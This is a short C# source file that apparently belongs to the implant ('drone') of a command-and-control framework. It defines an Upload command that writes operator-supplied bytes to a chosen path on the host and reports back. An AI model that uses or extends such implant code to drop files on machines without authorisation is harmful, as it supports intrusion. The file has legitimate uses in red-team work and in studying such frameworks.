using System.IO;
using System.Threading;
using System.Threading.Tasks;

using Drone.Models;

namespace Drone.Commands;

public sealed class Upload : DroneCommand
{
    public override byte Command => 0x06;
    
    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
    {
        File.WriteAllBytes(task.Arguments[0], task.Artefact);
        await Drone.SendTaskComplete(task);
    }
}